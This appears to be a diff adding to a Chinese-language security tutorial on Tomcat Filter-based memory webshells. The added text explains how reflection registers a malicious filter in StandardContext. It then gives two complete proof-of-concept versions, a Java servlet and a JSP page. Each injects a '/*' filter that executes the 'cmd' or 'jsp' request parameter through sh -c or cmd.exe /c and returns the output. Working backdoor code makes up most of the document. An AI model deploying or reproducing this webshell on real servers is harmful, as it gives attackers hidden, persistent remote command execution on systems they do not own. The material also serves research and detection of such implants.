@@ -279,6 +279,7 @@ Filter filter = new Filter() {
 如下代码将内存马融合进了反序列化的`payload`中，因此这里利用了反射来获取`FilterDef`对象。如果使用的是`jsp`或者是非反序列化的利用，则可以直接使用`new`来创建对象。
 
 ```java
+//反射获取 FilterDef，设置 filter 名等参数后，调用 addFilterDef 将 FilterDef 添加
 Class<?> FilterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
 Constructor filterDefDeclaredConstructor = FilterDef.getDeclaredConstructor();
 FilterDef filterDef = (FilterDef) filterDefDeclaredConstructor.newInstance();
@@ -289,6 +290,256 @@ standardContext.addFilterDef(filterDef);
 ```
 
 
+
+## 创建filterMap绑定URL
+通过反射创建`FilterMap`实例，该部分代码主要是注册`filter`的生效路由，并将`FilterMap`对象添加在`standardContext`中`FilterMaps`变量的第一个。
+
+```java
+//反射获取 FilterMap 并且设置拦截路径，并调用 addFilterMapBefore 将 FilterMap 添加进去
+Class<?> FilterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
+Constructor filterMapDeclaredConstructor = FilterMap.getDeclaredConstructor();
+FilterMap filterMap = (FilterMap) filterMapDeclaredConstructor.newInstance();
+filterMap.addURLPattern("/*");
+filterMap.setFilterName(FilterName);
+filterMap.setDispatcher(DispatcherType.REQUEST.name());
+standardContext.addFilterMapBefore(filterMap);
+```
+
+## 获取`filterConfigs`变量并添加`filterConfig`对象
+先获取在`standardContext`中存储的`filterConfigs`变量, 之后通过反射生成`ApplicationFilterConfig`对象，并将其放入`filterConfigs hashMap`中。
+
+```java
+Class<?> ApplicationFilterConfig = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
+Constructor<?> applicationFilterConfigDeclaredConstructor = ApplicationFilterConfig.getDeclaredConstructor(Context.class, FilterDef.class);
+applicationFilterConfigDeclaredConstructor.setAccessible(true);
+ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) applicationFilterConfigDeclaredConstructor.newInstance(standardContext, filterDef);
+filterConfigs.put(FilterName, filterConfig);
+```
+
+## POC
+### Java版本
+
+```java
+import org.apache.catalina.Context;
+import org.apache.catalina.core.ApplicationContext;
+import org.apache.catalina.core.StandardContext;
+import org.apache.tomcat.util.descriptor.web.FilterDef;
+import org.apache.tomcat.util.descriptor.web.FilterMap;
+import org.apache.catalina.core.ApplicationFilterConfig;
+
+import javax.servlet.*;
+import javax.servlet.annotation.WebServlet;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.io.IOException;
+import java.io.InputStream;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.util.Map;
+import java.util.Scanner;
+
+/**
+ * @Author: H3rmesk1t
+ * @Data: 2022/8/15 9:55 下午
+ */
+
+@WebServlet("/exploitServlet")
+public class exploitServlet extends HttpServlet {
+
+    protected void doGet(HttpServletRequest request, HttpServletResponse response) {
+
+        this.doPost(request, response);
+    }
+
+    protected void doPost(HttpServletRequest request, HttpServletResponse response) {
+
+        Field Configs = null;
+        Map filterConfigs;
+        try {
+            ServletContext servletContext = request.getSession().getServletContext();
+            Field appContext = servletContext.getClass().getDeclaredField("context");
+            appContext.setAccessible(true);
+            ApplicationContext applicationContext = (ApplicationContext) appContext.get(servletContext);
+
+            Field stdContext = applicationContext.getClass().getDeclaredField("context");
+            stdContext.setAccessible(true);
+            StandardContext standardContext = (StandardContext) stdContext.get(applicationContext);
+
+            String FilterName = "H3rmesk1t_Filter";
+            Configs = standardContext.getClass().getDeclaredField("filterConfigs");
+            Configs.setAccessible(true);
+            filterConfigs = (Map) Configs.get(standardContext);
+
+            if (filterConfigs.get(FilterName) == null) {
+                Filter filter = new Filter() {
+
+                    @Override
+                    public void init(FilterConfig filterConfig) {
+
+                    }
+
+                    @Override
+                    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
+
+                        HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
+                        if (httpServletRequest.getParameter("cmd") != null) {
+                            InputStream inputStream = Runtime.getRuntime().exec(httpServletRequest.getParameter("cmd")).getInputStream();
+                            Scanner scanner = new Scanner(inputStream).useDelimiter("\\A");
+                            String output = scanner.hasNext() ? scanner.next() : "";
+                            servletResponse.getWriter().write(output);
+                            return;
+                        }
+                        filterChain.doFilter(servletRequest, servletResponse);
+                    }
+
+                    @Override
+                    public void destroy() {
+
+                    }
+                };
+
+                Class<?> FilterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
+                Constructor filterDefDeclaredConstructor = FilterDef.getDeclaredConstructor();
+                FilterDef filterDef = (FilterDef) filterDefDeclaredConstructor.newInstance();
+                filterDef.setFilter(filter);
+                filterDef.setFilterName(FilterName);
+                filterDef.setFilterClass(filter.getClass().getName());
+                standardContext.addFilterDef(filterDef);
+
+                Class<?> FilterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
+                Constructor filterMapDeclaredConstructor = FilterMap.getDeclaredConstructor();
+                FilterMap filterMap = (FilterMap) filterMapDeclaredConstructor.newInstance();
+                filterMap.addURLPattern("/*");
+                filterMap.setFilterName(FilterName);
+                filterMap.setDispatcher(DispatcherType.REQUEST.name());
+                standardContext.addFilterMapBefore(filterMap);
+
+                Class<?> ApplicationFilterConfig = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
+                Constructor<?> applicationFilterConfigDeclaredConstructor = ApplicationFilterConfig.getDeclaredConstructor(Context.class, FilterDef.class);
+                applicationFilterConfigDeclaredConstructor.setAccessible(true);
+                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) applicationFilterConfigDeclaredConstructor.newInstance(standardContext, filterDef);
+                filterConfigs.put(FilterName, filterConfig);
+
+                response.getWriter().write("Inject Successfully!");
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+```
+
+### JSP版本
+
+```java
+<%@ page import="java.lang.reflect.Field" %>
+<%@ page import="org.apache.catalina.connector.Request" %>
+<%@ page import="org.apache.catalina.core.StandardContext" %>
+<%@ page import="java.util.Map" %>
+<%@ page import="java.io.IOException" %>
+<%@ page import="java.io.InputStream" %>
+<%@ page import="java.util.Scanner" %>
+<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
+<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
+<%@ page import="java.lang.reflect.Constructor" %>
+<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
+<%@ page import="org.apache.catalina.Context" %>
+<%@ page import="java.io.PushbackInputStream" %><%--
+  Created by IntelliJ IDEA.
+  User: h3rmesk1t
+  Date: 2022/8/15
+  Time: 1:32 下午
+  To change this template use File | Settings | File Templates.
+--%>
+<%@ page contentType="text/html;charset=UTF-8" language="java" %>
+<html>
+  <head>
+    <title>Filter</title>
+  </head>
+  <body>
+    <%
+      Field requestFiled = request.getClass().getDeclaredField("request");
+      requestFiled.setAccessible(true);
+      Request req = (Request) requestFiled.get(request);
+      StandardContext standardContext = (StandardContext) req.getContext();
+
+      Field configs = standardContext.getClass().getDeclaredField("filterConfigs");
+      configs.setAccessible(true);
+      Map filterConfigs = (Map) configs.get(standardContext);
+
+      String FilterName = "H3rmesk1t_Filter";
+      if (filterConfigs.get(FilterName) == null) {
+        Filter filter = new Filter() {
+          @Override
+          public void init(FilterConfig filterConfig) {
+
+          }
+
+          @Override
+          public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
+            HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
+            if (httpServletRequest.getParameter("jsp") != null) {
+              boolean isLinux = true;
+              String osType = System.getProperty("os.name");
+              if (osType != null && osType.toLowerCase().contains("win")) {
+                isLinux = false;
+              }
+
+              String[] cmds = isLinux ? new String[] {
+                      "sh",
+                      "-c",
+                      httpServletRequest.getParameter("jsp")
+              } : new String[] {
+                      "cmd.exe",
+                      "/c",
+                      httpServletRequest.getParameter("jsp")
+              };
+
+              InputStream inputStream = Runtime.getRuntime().exec(cmds).getInputStream();
+              Scanner scanner = new Scanner(inputStream).useDelimiter("\\a");
+              String output = scanner.hasNext() ? scanner.next() : "";
+              servletResponse.getWriter().write(output);
+              servletResponse.getWriter().flush();
+              return;
+            }
+            filterChain.doFilter(servletRequest, servletResponse);
+          }
+
+          @Override
+          public void destroy() {
+
+          }
+        };
+
+        Class<?> FilterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
+        Constructor filterDefDeclaredConstructor = FilterDef.getDeclaredConstructor();
+        FilterDef filterDef = (FilterDef) filterDefDeclaredConstructor.newInstance();
+        filterDef.setFilter(filter);
+        filterDef.setFilterName(FilterName);
+        filterDef.setFilterClass(filter.getClass().getName());
+        standardContext.addFilterDef(filterDef);
+
+        Class<?> FilterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
+        Constructor filterMapDeclaredConstructor = FilterMap.getDeclaredConstructor();
+        FilterMap filterMap = (FilterMap) filterMapDeclaredConstructor.newInstance();
+        filterMap.addURLPattern("/*");
+        filterMap.setFilterName(FilterName);
+        filterMap.setDispatcher(DispatcherType.REQUEST.name());
+        standardContext.addFilterMapBefore(filterMap);
+
+        Class<?> ApplicationFilterConfig = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
+        Constructor<?> applicationFilterConfigDeclaredConstructor = ApplicationFilterConfig.getDeclaredConstructor(Context.class, FilterDef.class);
+        applicationFilterConfigDeclaredConstructor.setAccessible(true);
+        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) applicationFilterConfigDeclaredConstructor.newInstance(standardContext, filterDef);
+        filterConfigs.put(FilterName, filterConfig);
+
+        System.out.print("Inject Successfully!");
+      }
+    %>
+  </body>
+</html>
+```
 
 
 
